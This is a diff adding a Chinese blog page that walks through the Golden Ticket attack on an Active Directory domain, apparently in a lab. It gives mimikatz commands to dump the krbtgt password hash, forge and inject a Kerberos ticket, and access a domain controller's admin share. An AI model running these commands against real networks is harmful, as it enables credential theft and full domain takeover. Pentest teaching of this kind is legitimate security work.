@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>域渗透(PTH) | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">域渗透(PTH)</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p><strong>介绍</strong><br>
+域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要我们拿到了krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击。</p>
+<!-- more -->
+<p><strong>步骤</strong><br>
+首先我们需要拿到krbtgt密码的hash<br>
+通过psexec我们拿到了域用户的shell，上传mimikatz,一句话执行拿hash<br>
+mimitakz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /path&quot; exit &gt; 1.txt<br>
+<img src="https://guokeya.github.io/post-images/1577951338651.png" alt="" loading="lazy"><br>
+我们来本机上生成Golden Ticket,这里需要修改对应的域管理员账号、域名称、SID</p>
+<pre><code>kerberos::golden /user:域管理员账号 /domain:域名称 /sid:域的sid /krbtgt:krbtgt用户的hash /ticket:自定义名称
+kerberos::golden /user:Administrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /ticket:test.kirbi
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577951363533.png" alt="" loading="lazy"><br>
+导入票据<br>
+kerberos::ptt test.kirbi<br>
+<img src="https://guokeya.github.io/post-images/1577951370096.png" alt="" loading="lazy"><br>
+在域成员上，执行klist，即可查看缓存的票据<br>
+<img src="https://guokeya.github.io/post-images/1577951375016.png" alt="" loading="lazy"><br>
+当前域客户端为Administrator<br>
+登陆域控<br>
+dir \域控IP\c$</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">
+                    渗透测试
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/4KUONk_8X/">
+                  <h3 class="post-title">
+                    域渗透(基础)
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
